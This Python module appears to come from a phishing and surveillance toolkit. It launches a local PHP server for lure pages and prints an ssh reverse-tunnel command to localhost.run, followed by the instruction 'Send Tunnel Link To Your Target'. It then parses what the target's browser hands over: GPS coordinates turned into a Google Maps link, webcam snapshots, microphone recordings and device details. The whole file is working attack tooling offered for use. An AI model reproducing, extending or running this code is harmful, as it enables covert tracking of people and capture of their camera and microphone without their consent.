import random,subprocess,os,json
from module.colors import c
from module.messages import show_message
from time import sleep

#GET RANDOM PORT
randPort = random.choice(range(1000,10000))

#function for return to back MainMenu
def continue_proc(con_path=' ',con_status=True):
   if con_status == True:
      with open(f"template/{con_path}","w") as clear_file:
         clear_file.write("")
      sleep(2)      
      back_menu = input(c.cyan+"\nDo You Want To Back Menu ?"+c.yellow+" [Y or N] : "+c.re).upper()
      if back_menu == "Y":
            return "Exit"
      else:
            return "continue"     

#Function For After User Open Url information
def After_click(Ac_path,Ac_msg):
    sleep(5)
    file_size = 0
    if os.stat(f"template/{Ac_path}").st_size != file_size:
            data = open(f"template/{Ac_path}","r").read()
            data_decode = json.loads(data)
            print("\n")
            for i in data_decode:
                if data_decode[i] == None:
                            data_decode[i] = "None" 
                print(c.grey+ " "+i.replace("-"," ")+c.green+" : "+c.red+data_decode[i])
                with open(f"template/{Ac_path}","w+") as file :
                    file.write("")
            sleep(2)          
            show_message(Ac_msg)  
 
    else:  
      pass    
 
           
 
#Function for After User Acess Permision
def Before_click(Bc_template,Bc_focus=' ',Bc_status=True):
            sleep(5)
            file_size = 0
     #   try:

            if os.stat(f"template/{Bc_template}").st_size != file_size:

                if Bc_focus == "location":
                    
                    data = open(f"template/{Bc_template}","r").read()
                    location_file_json_decode = json.loads(data)
                    print(c.re+"\n Google Map Link : "+c.green+f"https://www.google.com/maps/place/{location_file_json_decode['lat']}+{location_file_json_decode['lon']}")

                    result = continue_proc(
                       con_path=Bc_template,
                       con_status=Bc_status
                    )  
                    return result                   
                
                elif Bc_focus == "webcam":
                    data = open(f"template/{Bc_template}","r").read()
                    webcam_file_json_decode = json.loads(data)
                    print(c.re+"\n Image "+c.green+f"{webcam_file_json_decode['File-Name']} Saved > Please Check /images Folder ")
                            

                    result = continue_proc(
                      con_path=Bc_template,
                      con_status=Bc_status
                   )  
                    return result

                
                elif Bc_focus == "microphone":
                    data = open(f"template/{Bc_template}","r").read()
                    microphone_file_json_decode = json.loads(data)
                    print(c.re+"\n Voice "+c.green+f"{microphone_file_json_decode['File-Name']} Saved > Please Check /sounds Folder ")

                    result = continue_proc(
                       con_path=Bc_template,
                       con_status=Bc_status
                    )  
                    return result


    #    except Exception as Ex:
         #   exit(Ex)
           


#Function for weather template user access Error
def error_handler(error_handler_path_file):
    sleep(2)
    file_size = 0
    if os.stat(f"template/{error_handler_path_file}").st_size != file_size:

        with open(f'template/{error_handler_path_file}','r') as file:
           log = file.read()
           print(c.re+"[ * ] "+c.green+str(log))
            
        with open(f"template/{error_handler_path_file}", 'w') as clear_file_error:
                clear_file_error.write("")

        result = continue_proc(
                con_status=True,
                con_path=error_handler_path_file)               
        return result


# Function For Run Local host 
def run_php_server(port,dir_name):
  with open(f"log/{dir_name}-php.log","w+") as php_log: 
       args =("php","-S",f"localhost:{randPort}","-t",f"template/{dir_name}")
       proc_info = subprocess.Popen(args,stderr=php_log,stdout=php_log).pid
       with open("Settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
        data["pid"].append(proc_info)

       with open("Settings.json", "w") as jsonFile:
           json.dump(data, jsonFile)

      
  print(c.red+"[ ● ] "+c.green+"Link : "+c.cyan+f"http://127.0.0.1:{randPort}\n"+c.red+"[*] "+c.yellow+"Please open a new Terminal And Run This command.\n"+c.red+"[*]"+c.green+f" Command =>"+c.grey+f" ssh -R 80:127.0.0.1:{randPort} nokey@localhost.run\n"+c.red+"[*]"+c.green+" Then Send Tunnel Link To Your Target !!!\n ")
 
